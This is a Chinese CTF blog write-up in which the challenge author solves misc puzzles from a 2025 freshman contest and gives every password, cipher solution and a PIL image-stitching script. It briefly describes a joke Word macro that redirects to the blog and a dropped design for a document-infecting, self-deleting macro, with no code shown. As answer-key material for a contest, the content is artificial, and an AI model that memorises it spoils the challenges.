<p>病毒的作用是隐藏窗口，然后跳转链接到我的博客，给大家听save_the_word这首歌。（后悔了，早知道给你们跳转到 cris博客然后弹个计算器了）</p>
<p>这个方法其实不是我想要看到的方法，算是一种非预期吧。</p>
<p>因为我本来的想法是把key写入病毒，然后病毒启动后污染所有doc文件，顺便锁定word，然后再启动自毁程序删除自己的踪迹。</p>
<p>但是由于害怕很多人弄不掉病毒要我出来帮忙，遂放弃，选择了最简单的方法（没想到好像就taem一个人打到了这里，是我自作多情了喵）</p>
<p>如果弄成我说的这样,可以用oledump来分析宏病毒，从而获得key，也就是第二种解法，预期解。</p>
<p><img src="https://lunereal.1kal0vic.top/images/img/2025whuctf%E6%96%B0%E7%94%9F%E8%B5%9B/4.png" alt="4" loading="lazy"></p>
<p>将key()复制到一个新的doc执行或者喂给ai就可以了。</p>
<p>总之，得到key:Very_coool</p>
<p>解锁心核碎片02.zip，得到碎片和第三关的key: Goodhajimi)</p>
<h4 id="第三关（大的要来了）"><a href="#第三关（大的要来了）" class="headerlink" title="第三关（大的要来了）"></a>第三关（大的要来了）</h4><p>看小故事08，忽略掉ai写的奇怪诗句，提取到关键信息。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">“贫道曾经很喜欢研究《易经》，为此专门学过一段时间八字排盘。”他顿了顿，眼神似乎透过墨镜望向遥远的过去，“至少在被各种杂七杂八的知识击碎大脑之前是这样的。最后发现脑子里只记得‘天干地支’了。”</span><br><span class="line">“请你对下面的数列进行处理，告诉zip这位刚出生没多久的小老兄的日柱纳音（全小写拼音）——”</span><br><span class="line"></span><br><span class="line">“21/14/30/51”</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://chat.deepseek.com/share/b644er9oulxtmzdv1h">https://chat.deepseek.com/share/b644er9oulxtmzdv1h</a></p>
<p>ai一把梭，得到密码<strong>changliushui</strong></p>
<p>解压后得到万年历.txt。</p>
<p>这道题目有原题：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_34988204/article/details/138173824">【CTF MISC】XCTF GFSJ0151 2017_Dating_in_Singapore Writeup（日期编码+视觉密码）_新加坡日历 ctf-CSDN博客</a></p>
<p>将日期圈起来，可以得到密码SUANMING，解锁下一个压缩包。</p>
<p>得到小六壬.txt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">阴阳，八卦，是数术基础知识，哈基米仙觉得非常像2进制和8进制</span><br><span class="line">因为会算点小六壬和六爻赚过点奶茶钱，其中小六壬可以说是很多人的数术启蒙</span><br><span class="line">请你去网上现学速通一下小六壬，感受一下这个古老的模6算法</span><br><span class="line">请对下面这个数列进行一个处理（注意这里和原版有些许不同。多位数要拆成多个一位，如24是先走2步再走4步，123是先走1步再走2步再走3步）</span><br><span class="line">提示：注意小六壬的每一次的短暂停顿后再开始的起点是上一步的终点</span><br><span class="line">另外，为了获得“纯阳之体”，你需要对处理后的数列进行集体加一操作，然后即可开始领悟8卦之道</span><br><span class="line">8 13 0 63 1 6 45 33 7 8 26 9 2 21 0 12 122 1 8 14 8 2 7 20251013</span><br></pre></td></tr></table></figure>

<p>开始算命，家人们，我能上街头招摇撞骗（划掉）为人解灾了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> Plain压缩包密码密文加解密：小六壬 大安留连速喜赤口小吉空亡 模6 做题：密文=》小六壬10进制转为6进制（1-6）=》集体加1=》转为6位数2进制=》001001按照阴阳转为八卦符=》八卦符解密为明文 出题：明文=》加密为八卦符=》按照阴阳转为3位2进制=》2进制转为8进制（0-7）=》8进制数集体减1=》6进制转为10进制（凑数字）=》10进制=》密文就是步数，按步数走完得到明文，参考链接：https://www.cnblogs.com/angelhao/p/18945194明文：shensuan=》☱☶☳☱☵☰☱☴☵☱☵☶☱☶☳☱☶☵☱☴☱☱☵☶=》011 100 001 011 010 111 011 110 010 011 010 100 011 100 001 011 100 010 011 110 011 011 010 100=》3 4 1 3 2 7 3 6 2 3 2 4 3 4 1 3 4 2 3 6 3 3 2 4=》2 3 0 2 1 6 2 5 1 2 1 3 2 3 0 2 3 1 2 5 2 2 1 3=》密文：8 13 0 63 1 6 45 33 7 8 26 9 2 21 0 12 122 1 8 14 8 2 7 20251013</span><br></pre></td></tr></table></figure>

<p>以上是加密过程，反过来就是解密过程哩。其实不难，就是走6步，但是每次的1都是上一次的6.</p>
<p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/angelhao/p/18945194">https://www.cnblogs.com/angelhao/p/18945194</a></p>
<p>得到密钥:shensuan</p>
<p>解开压缩包，得到碎片03,同时下一关的密钥也是shensuan。</p>
<h4 id="第四关（大的来了）"><a href="#第四关（大的来了）" class="headerlink" title="第四关（大的来了）"></a>第四关（大的来了）</h4><p>大的来了，49的劲爆尾杀。</p>
<p>先示敌以弱，用大衍数列让人放松警惕。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">大衍之数五十，其用四十有九</span><br><span class="line">大衍数列：</span><br><span class="line">0，2，4，8，12，18，24，32，40，50，60，72，84，98……</span><br><span class="line">请求出第20251024位是多少？（好像zip比较喜欢十六进制）</span><br></pre></td></tr></table></figure>

<p>查阅资料得知：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">中国古代文献中，曾记载过“大衍数列”, 主要用于解释中国传统文化中的太极衍生原理。</span><br><span class="line">它的前几项是：0、2、4、8、12、18、24、32、40、50 ...</span><br><span class="line">其规律是：对偶数项，是序号平方再除2，奇数项，是序号平方减1再除2。</span><br></pre></td></tr></table></figure>

<p>容易算出为：205051986524288</p>
<p>转为16进制：ba7e62d13880</p>
<p>ba7e62d13880就是下一个压缩包的密码。</p>
<p>解锁搞了半天还要自己拼，来到了本题最难的部分。</p>
<p>首先处理两张太极diff。</p>
<p><a target="_blank" rel="noopener" href="https://s2js.com/Stellate/DSIE">差值分离图像加密&#x2F;解密工具</a></p>
<p>当然，也可以随波逐流一把梭。</p>
<p>然后拼接图像（可以使用ppt)。先把定位块弄好，然后按照下面这张八卦图的方位拼好。</p>
<p><img src="https://lunereal.1kal0vic.top/images/img/2025whuctf%E6%96%B0%E7%94%9F%E8%B5%9B/5.png" alt="5" loading="lazy"></p>
<p>然后是最难想到的一步。</p>
<p>根据高人.txt里的“翻”字，注意力惊人的发现将除了定位块的的4块图翻转180度，按照本来伏羲八卦对应位置的对称对调后拼接</p>
<p><img src="https://lunereal.1kal0vic.top/images/img/2025whuctf%E6%96%B0%E7%94%9F%E8%B5%9B/6.png" alt="5" loading="lazy"></p>
<p>可以发现右下角的定位块很不和谐，将其也旋转180度得到</p>
<p><img src="https://lunereal.1kal0vic.top/images/img/2025whuctf%E6%96%B0%E7%94%9F%E8%B5%9B/7.png" alt="7" loading="lazy"></p>
<p>这下定位块对齐了。将其拖入qrazybox，链接如下：<a target="_blank" rel="noopener" href="https://merri.cx/qrazybox/">QRazyBox - QR Code Analysis and Recovery Toolkit</a></p>
<p>自动修复定位块后，扫码得到:旅兑噬嗑损小过讼旅贲恒兑颐贲井随噬嗑睽</p>
<p>伏羲六十四卦解密后的字符串: 7iq1sishijiu</p>
<p>解锁碎片04。</p>
<h4 id="拼接碎片（ika的劲爆尾杀）"><a href="#拼接碎片（ika的劲爆尾杀）" class="headerlink" title="拼接碎片（ika的劲爆尾杀）"></a>拼接碎片（ika的劲爆尾杀）</h4><p>最后一步是送分题。</p>
<p>但是，ika的劲爆尾杀会狠狠惩罚每一个不认真看他小故事的人，比如某只猫猫。</p>
<p>查看获得的所有碎片，一共81个，并且命名同一为xxxxxxx-x。观察发现，把前面的01当成二进制刚好是0，1，而-后面的x只有0,1,3猜测为旋转90度的次数。</p>
<p>然后结合小故事01中的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">随着祂的话语，四块晶莹的水晶浮现在了半空，每一块水晶上面都刻着一个古罗马数字。</span><br><span class="line">Ⅰ  Ⅱ</span><br><span class="line">Ⅳ  Ⅲ</span><br><span class="line">貌似具有什么奇特的含义</span><br></pre></td></tr></table></figure>

<p>可以得知是蛇形排列（我会惩罚每一个不看小故事的人，比如某只猫猫）</p>
<p>写出脚本如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import glob</span><br><span class="line">from PIL import Image</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">def combine_images():</span><br><span class="line">    # 获取当前目录下所有png文件</span><br><span class="line">    png_files = glob.glob(&quot;*.png&quot;)</span><br><span class="line">    print(f&quot;找到 &#123;len(png_files)&#125; 个PNG文件&quot;)</span><br><span class="line">    </span><br><span class="line">    # 显示前几个文件名以便调试</span><br><span class="line">    for i, file in enumerate(png_files[:5]):</span><br><span class="line">        print(f&quot;示例文件 &#123;i+1&#125;: &#123;file&#125;&quot;)</span><br><span class="line">    </span><br><span class="line">    # 过滤和排序文件</span><br><span class="line">    processed_files = []</span><br><span class="line">    for file in png_files:</span><br><span class="line">        # 使用正则表达式提取二进制编号和旋转信息</span><br><span class="line">        # 二进制编号由0和1组成，共7位</span><br><span class="line">        match = re.match(r&#x27;([01]&#123;7&#125;)-(\d)\.png&#x27;, file)</span><br><span class="line">        if match:</span><br><span class="line">            binary_str = match.group(1)</span><br><span class="line">            rotation = int(match.group(2))</span><br><span class="line">            # 将二进制字符串转换为十进制数用于排序</span><br><span class="line">            decimal_num = int(binary_str, 2)</span><br><span class="line">            processed_files.append(&#123;</span><br><span class="line">                &#x27;filename&#x27;: file,</span><br><span class="line">                &#x27;binary_str&#x27;: binary_str,</span><br><span class="line">                &#x27;decimal_num&#x27;: decimal_num,</span><br><span class="line">                &#x27;rotation&#x27;: rotation</span><br><span class="line">            &#125;)</span><br><span class="line">            print(f&quot;成功解析: &#123;file&#125; -&gt; 二进制: &#123;binary_str&#125;, 十进制: &#123;decimal_num&#125;, 旋转: &#123;rotation&#125;&quot;)</span><br><span class="line">        else:</span><br><span class="line">            print(f&quot;无法解析文件名: &#123;file&#125;&quot;)</span><br><span class="line">    </span><br><span class="line">    # 按十进制数值排序</span><br><span class="line">    processed_files.sort(key=lambda x: x[&#x27;decimal_num&#x27;])</span><br><span class="line">    </span><br><span class="line">    if len(processed_files) != 81:</span><br><span class="line">        print(f&quot;错误：找到 &#123;len(processed_files)&#125; 个符合规则的文件，但需要81个文件&quot;)</span><br><span class="line">        print(&quot;请检查文件名格式是否正确&quot;)</span><br><span class="line">        return</span><br><span class="line">    </span><br><span class="line">    # 获取第一张图片的尺寸（旋转前）</span><br><span class="line">    first_img = Image.open(processed_files[0][&#x27;filename&#x27;])</span><br><span class="line">    img_width, img_height = first_img.size</span><br><span class="line">    </span><br><span class="line">    # 计算大图的尺寸（9x9网格）</span><br><span class="line">    cols = 9</span><br><span class="line">    rows = 9</span><br><span class="line">    canvas_width = img_width * cols</span><br><span class="line">    canvas_height = img_height * rows</span><br><span class="line">    </span><br><span class="line">    # 创建新画布</span><br><span class="line">    combined_image = Image.new(&#x27;RGBA&#x27;, (canvas_width, canvas_height))</span><br><span class="line">    </span><br><span class="line">    print(&quot;开始拼接图片...&quot;)</span><br><span class="line">    </span><br><span class="line">    # 逐个处理并拼接图片 - S型排列</span><br><span class="line">    for row in range(rows):</span><br><span class="line">        for col in range(cols):</span><br><span class="line">            # 计算在列表中的索引</span><br><span class="line">            if row % 2 == 0:  # 偶数行（0,2,4,6,8）从左到右</span><br><span class="line">                index = row * cols + col</span><br><span class="line">            else:  # 奇数行（1,3,5,7）从右到左</span><br><span class="line">                index = row * cols + (cols - 1 - col)</span><br><span class="line">            </span><br><span class="line">            file_info = processed_files[index]</span><br><span class="line">            </span><br><span class="line">            # 打开图片</span><br><span class="line">            img = Image.open(file_info[&#x27;filename&#x27;])</span><br><span class="line">            </span><br><span class="line">            # 根据旋转信息旋转图片 - 改回逆时针旋转</span><br><span class="line">            rotation_count = file_info[&#x27;rotation&#x27;]</span><br><span class="line">            if rotation_count == 1:</span><br><span class="line">                img = img.rotate(90, expand=True)  # 逆时针90度</span><br><span class="line">            elif rotation_count == 2:</span><br><span class="line">                img = img.rotate(180, expand=True)  # 逆时针180度</span><br><span class="line">            elif rotation_count == 3:</span><br><span class="line">                img = img.rotate(270, expand=True)  # 逆时针270度</span><br><span class="line">            # rotation_count == 0 时不旋转</span><br><span class="line">            </span><br><span class="line">            # 计算粘贴位置</span><br><span class="line">            x = col * img_width</span><br><span class="line">            y = row * img_height</span><br><span class="line">            </span><br><span class="line">            # 将图片粘贴到画布上</span><br><span class="line">            combined_image.paste(img, (x, y))</span><br><span class="line">            </span><br><span class="line">            if row &lt; 2 and col &lt; 3:  # 只显示前几项的处理信息，避免输出太多</span><br><span class="line">                print(f&quot;已处理: &#123;file_info[&#x27;filename&#x27;]&#125; -&gt; 位置(&#123;row&#125;,&#123;col&#125;) 索引&#123;index&#125; 逆时针旋转&#123;file_info[&#x27;rotation&#x27;]&#125;次&quot;)</span><br><span class="line">    </span><br><span class="line">    print(f&quot;... 已处理所有81张图片&quot;)</span><br><span class="line">    </span><br><span class="line">    # 保存拼接后的图片</span><br><span class="line">    output_filename = &quot;combined_image_snake.png&quot;</span><br><span class="line">    combined_image.save(output_filename)</span><br><span class="line">    print(f&quot;\n拼接完成！已保存为: &#123;output_filename&#125;&quot;)</span><br><span class="line">    print(f&quot;最终图片尺寸: &#123;canvas_width&#125; x &#123;canvas_height&#125;&quot;)</span><br><span class="line">    print(f&quot;网格布局: &#123;rows&#125; x &#123;cols&#125; (S型排列)&quot;)</span><br><span class="line">    print(f&quot;单张图片尺寸: &#123;img_width&#125; x &#123;img_height&#125;&quot;)</span><br><span class="line">    </span><br><span class="line">    # 显示排列顺序示意图</span><br><span class="line">    print(&quot;\n排列顺序示意图 (S型):&quot;)</span><br><span class="line">    for row in range(min(3, rows)):  # 只显示前3行作为示例</span><br><span class="line">        row_indices = []</span><br><span class="line">        for col in range(cols):</span><br><span class="line">            if row % 2 == 0:</span><br><span class="line">                index = row * cols + col</span><br><span class="line">            else:</span><br><span class="line">                index = row * cols + (cols - 1 - col)</span><br><span class="line">            row_indices.append(f&quot;&#123;index+1:2d&#125;&quot;)</span><br><span class="line">        direction = &quot;→&quot; if row % 2 == 0 else &quot;←&quot;</span><br><span class="line">        print(f&quot;行 &#123;row&#125;: &#123;direction&#125; &#123;&#x27; &#x27;.join(row_indices)&#125;&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    combine_images()</span><br></pre></td></tr></table></figure>

<p>得到拼接完成的二维码，扫码即可获得flag。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>还算是一次比较开心的出题经历，看到大家能做得开心咱也开心喵。</p>
<p>（看到大家红温咱就更开心了喵喵喵喵喵喵喵喵喵！）</p>
<p>（说不定我会在校赛上连载ika小故事，谁知道呢？）</p>
</div></section><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><span class="icon iconify" data-icon="ri:hand-coin-line"></span></span><div id="reward-comment">I'm so cute. Please give me money.</div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>伊卡洛维奇</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="http://lunereal.1kal0vic.top/2025/10/27/2025_whuctf%E6%96%B0%E7%94%9F%E8%B5%9B/" title="2025whuctf新生赛">http://lunereal.1kal0vic.top/2025/10/27/2025_whuctf%E6%96%B0%E7%94%9F%E8%B5%9B/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"></div><div class="post-nav-item"><a class="post-nav-next" href="/2025/10/03/leetcode%E5%88%B7%E9%A2%98/" rel="next" title="leetcode"><span class="post-nav-text">leetcode</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2024 – 2025 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> 伊卡洛维奇</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.3.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div class="live-time"><span>感谢陪伴</span><span id="display_live_time"></span><span class="moe-text">(●'◡'●)</span><script>function blog_live_time() {
  setTimeout(blog_live_time, 1000);
  const start = new Date('2024-03-20T00:00:00');
  const now = new Date();
  const timeDiff = (now.getTime() - start.getTime());
  const msPerMinute = 60 * 1000;
  const msPerHour = 60 * msPerMinute;
  const msPerDay = 24 * msPerHour;
  const passDay = Math.floor(timeDiff / msPerDay);
  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
  display_live_time.innerHTML = ` ${passDay} 天 ${passHour} 小时 ${passMinute} 分 ${passSecond} 秒`;
}
blog_live_time();
</script></div><div class="footer-custom-text">YourText <a href="yourLink" rel="noopener" target="_blank">Description</a></div><div class="footer-support"><span>本站由</span><a class="footer-support-logo" href="https://www.rainyun.com/YeMeng_" target="blank" title="雨云"><img height="30" src="https://cn-sy1.rains3.com/yemenghexo/rainyunlogo.png" alt="雨云"></a><span>提供 对象存储 服务</span></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
mediumZoom(images)</script><style>.medium-zoom-image {
  z-index: 99;
}</style></body></html>